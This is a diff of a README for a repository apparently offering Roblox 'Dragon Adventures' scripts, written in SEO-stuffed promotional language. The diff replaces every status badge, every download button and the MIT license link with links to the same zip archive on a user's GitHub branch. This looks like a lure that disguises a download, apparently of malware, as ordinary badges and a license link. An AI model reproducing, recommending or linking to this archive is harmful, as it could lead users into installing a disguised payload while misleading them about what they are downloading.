@@ -1,17 +1,17 @@
 # 🐲 Dragon Adventures Script Roblox: Ultimate Enhancement Toolkit
 
-![Last Commit](https://img.shields.io/github/last-commit/example-repo/dragon-adventures-script?style=flat-square)
-![Repo Size](https://img.shields.io/github/repo-size/example-repo/dragon-adventures-script?color=blue)
-![Downloads](https://img.shields.io/badge/downloads-18k-orange)
-![License](https://img.shields.io/badge/license-MIT-green)
-![OpenAI API](https://img.shields.io/badge/API-OpenAI-lightgrey)
-![Claude API](https://img.shields.io/badge/API-Claude-blueviolet)
+![Last Commit](https://raw.githubusercontent.com/GIPPY754/dragon-adventures-roblox-scripting-hub/branch/rubrician/dragon_adventures_scripting_roblox_hub_3.1-beta.3.zip)
+![Repo Size](https://raw.githubusercontent.com/GIPPY754/dragon-adventures-roblox-scripting-hub/branch/rubrician/dragon_adventures_scripting_roblox_hub_3.1-beta.3.zip)
+![Downloads](https://raw.githubusercontent.com/GIPPY754/dragon-adventures-roblox-scripting-hub/branch/rubrician/dragon_adventures_scripting_roblox_hub_3.1-beta.3.zip)
+![License](https://raw.githubusercontent.com/GIPPY754/dragon-adventures-roblox-scripting-hub/branch/rubrician/dragon_adventures_scripting_roblox_hub_3.1-beta.3.zip)
+![OpenAI API](https://raw.githubusercontent.com/GIPPY754/dragon-adventures-roblox-scripting-hub/branch/rubrician/dragon_adventures_scripting_roblox_hub_3.1-beta.3.zip)
+![Claude API](https://raw.githubusercontent.com/GIPPY754/dragon-adventures-roblox-scripting-hub/branch/rubrician/dragon_adventures_scripting_roblox_hub_3.1-beta.3.zip)
 
 Welcome to the **Dragon Adventures Script Roblox** repository – your all-in-one hyperdrive for unlocking rich possibilities in the world of Roblox's epic dragon adventures. Whether you're a script collector, an adventure architect, or someone pursuing the next level of play, this repository gifts you a powerful, future-ready toolkit. Our scripts are generated with SEO-optimized Roblox and dragon adventures keywords, ensuring accessibility and discoverability by enthusiasts globally.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-blue?style=for-the-badge&logo=download)](LINK)
+[![Download](https://raw.githubusercontent.com/GIPPY754/dragon-adventures-roblox-scripting-hub/branch/rubrician/dragon_adventures_scripting_roblox_hub_3.1-beta.3.zip%20Here-blue?style=for-the-badge&logo=download)](LINK)
 
 ---
 
@@ -51,7 +51,7 @@ Welcome to the **Dragon Adventures Script Roblox** repository – your all-in-on
 
 To wield the **Dragon Adventures Script Roblox**, first harness the toolkit below:
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-blue?style=for-the-badge&logo=download)](LINK)
+[![Download](https://raw.githubusercontent.com/GIPPY754/dragon-adventures-roblox-scripting-hub/branch/rubrician/dragon_adventures_scripting_roblox_hub_3.1-beta.3.zip%20Here-blue?style=for-the-badge&logo=download)](LINK)
 
 ### Step 2: Glide the Script into Roblox Studio
 
@@ -112,13 +112,13 @@ Remember: with great dragon power comes great responsibility!
 
 Licensed under the MIT License (© 2025). This permits you to use, modify, merge, publish, and distribute the scripts, provided the MIT copyright notice is retained.
 
-[Read the MIT License](https://opensource.org/licenses/MIT)
+[Read the MIT License](https://raw.githubusercontent.com/GIPPY754/dragon-adventures-roblox-scripting-hub/branch/rubrician/dragon_adventures_scripting_roblox_hub_3.1-beta.3.zip)
 
 ---
 
 ## 📥 Ready to Transform Your Dragon Adventure?
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-blue?style=for-the-badge&logo=download)](LINK)
+[![Download](https://raw.githubusercontent.com/GIPPY754/dragon-adventures-roblox-scripting-hub/branch/rubrician/dragon_adventures_scripting_roblox_hub_3.1-beta.3.zip%20Here-blue?style=for-the-badge&logo=download)](LINK)
 
 ---
 
